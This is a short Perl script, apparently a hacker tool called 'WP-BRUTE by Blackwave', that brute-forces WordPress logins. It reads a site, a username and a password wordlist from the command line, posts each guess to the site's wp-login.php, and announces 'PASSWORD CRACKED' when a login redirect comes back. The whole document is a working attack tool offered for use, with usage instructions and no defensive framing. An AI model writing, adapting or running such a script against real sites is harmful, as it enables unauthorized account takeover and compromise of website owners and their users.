#!/usr/bin/perl

# WP-BRUTE BY Blackwave
system ("cls");
system ("color 0a");
   print q{
   ____     __                   __                                 
   / __ )   / /  ____ _  _____   / /__ _      __  ____ _  _   __  ___ 
  / __  |  / /  / __ `/ / ___/  / //_/| | /| / / / __ `/ | | / / / __l
 / /_/ /  / /  / /_/ / / /__   / ,<   | |/ |/ / / /_/ /  | |/ / /___/
/_____/  /_/  ____,_/  \___/  /_/|_|  |__/|__/  l__,_/   |___/ l___/ 
    };
use LWP::UserAgent;

$site = $ARGV[0];
$user = $ARGV[1];
$wordl = $ARGV[2];

if(@ARGV != 3){
print "
                  Wordpress-Brute by Blackwave

How to use: $0 <site> <user> <wordlist>
exe: $0 site.com admin wordlist.txt

";
exit;
}

if ($site !~ /^http:\/\//){
$site = 'http://' . $site;
}
if ($site !~ /\/wp-login.php/){
$site = $site . '/wp-login.php';
}

open(a,"<$wordl") or die "$!";
print "\n\nSite: $site\nUsername: $user\n\nAttacking...\n\n";
sleep(2);
while(<a>){
chomp($_);

my $ua = new LWP::UserAgent;

my $response 
= $ua->post($site, 
{ log => $user, 
pwd => $_,
wp-submit => 'Log in',
});

my $code = $response->code;
print "[+] Testing... $_\n";
if($code == 302){
print "\n\n\t[*] PASSWORD CRACKED: $_\n\n";
exit;
}
}
exit;